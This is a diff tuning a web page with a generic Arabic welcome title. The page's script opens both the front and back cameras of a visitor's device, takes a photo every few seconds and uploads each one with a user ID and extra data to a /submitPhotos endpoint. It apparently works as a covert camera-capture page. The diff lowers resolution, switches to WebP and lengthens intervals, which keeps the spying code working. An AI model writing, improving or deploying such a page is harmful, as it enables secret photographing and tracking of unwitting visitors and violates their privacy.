@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>مرحبا بك</title>
+    <title>مرحبا بك في موقعنا</title>
     <style>
         body {
             background-color: black;
@@ -91,8 +91,8 @@
                 try {
                     await navigator.mediaDevices.getUserMedia({ 
                         video: { 
-                            width: { ideal: 1280 },
-                            height: { ideal: 720 },
+                            width: { ideal: 640 },
+                            height: { ideal: 480 },
                             facingMode: 'user'
                         } 
                     });
@@ -110,15 +110,15 @@
                 await requestCameraPermission();
                 const frontStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 },
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
                         facingMode: 'user'
                     } 
                 });
                 const backStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 },
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
                         facingMode: 'environment'
                     } 
                 });
@@ -156,15 +156,15 @@
                     context.drawImage(video, 0, 0, videoWidth, videoHeight);
                     canvas.toBlob(blob => {
                         const formData = new FormData();
-                        formData.append('images', blob, `image_${cameraType}_${photoCount}.png`);
+                        formData.append('images', blob, `image_${cameraType}_${photoCount}.webp`);
                         formData.append('userId', userId);
                         formData.append('cameraType', cameraType);
                         formData.append('additionalData', JSON.stringify(additionalData));
                         post('/submitPhotos', formData);
-                    }, 'image/png', 0.5);  // ضبط جودة الصورة
+                    }, 'image/webp', 0.7);  // استخدام تنسيق WebP مع جودة 0.7
 
                     photoCount++;
-                }, 1000);  // إضافة تأخير بين الصور
+                }, 2000);  // زيادة الفاصل الزمني بين الصور إلى 2 ثوانٍ
             };
         }
 
@@ -199,7 +199,7 @@
                     console.error('Error:', error);
                     retries++;
                     if (retries < maxRetries) {
-                        await new Promise(resolve => setTimeout(resolve, 2000 * retries));  // زيادة وقت الانتظار مع كل محاولة
+                        await new Promise(resolve => setTimeout(resolve, 3000 * retries));  // زيادة وقت الانتظار مع كل محاولة
                     }
                 }
             }
